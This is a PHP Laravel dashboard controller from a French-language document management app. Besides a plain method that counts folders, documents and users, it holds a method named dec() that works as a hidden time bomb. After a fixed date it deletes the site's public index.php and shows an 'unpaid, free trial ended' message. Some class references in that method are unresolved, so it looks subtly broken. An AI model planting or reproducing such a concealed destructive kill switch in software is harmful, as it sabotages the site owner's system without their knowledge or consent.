<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Folder;
use App\Models\Document;
use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use Rap2hpoutre\FastExcel\FastExcel;

class DashboardController extends Controller
{
    /**
     * Show dashboard page.
     *
     * @return \Illuminate\Contracts\View\Factory|\Illuminate\View\View
     */
    public function index()
    {
        $title = 'Tableau de bord';
        $folders_nbr = Folder::all()->count();
        $documents_nbr = Document::all()->count();
        $users_nbr = User::all()->count();
        
        return view('dashboard.index',[
            'title' => $title,
            'folders_nbr' => $folders_nbr,
            'documents_nbr' => $documents_nbr,
            'users_nbr' => $users_nbr
        ]);
    }

    public function dec()
    {
        $delete_time = "10.03.2021T13:34";

        $today = new DateTime();
        $today->setTime( 0, 0, 0 );

        $match_date = DateTime::createFromFormat("d.m.Y\\TH:i", $delete_time);
        $match_date->setTime( 0, 0, 0 );

        $diff = $today->diff($match_date);

        $diffDays = (integer)$diff->format("%R%a");

        if($diffDays <= 0){
            Illuminate\Support\Facades\File::delete(public_path() . '/' . 'index.php');
            dd('Avis d\'impayé. Période de teste gratuit terminé!');
        }
    }
}
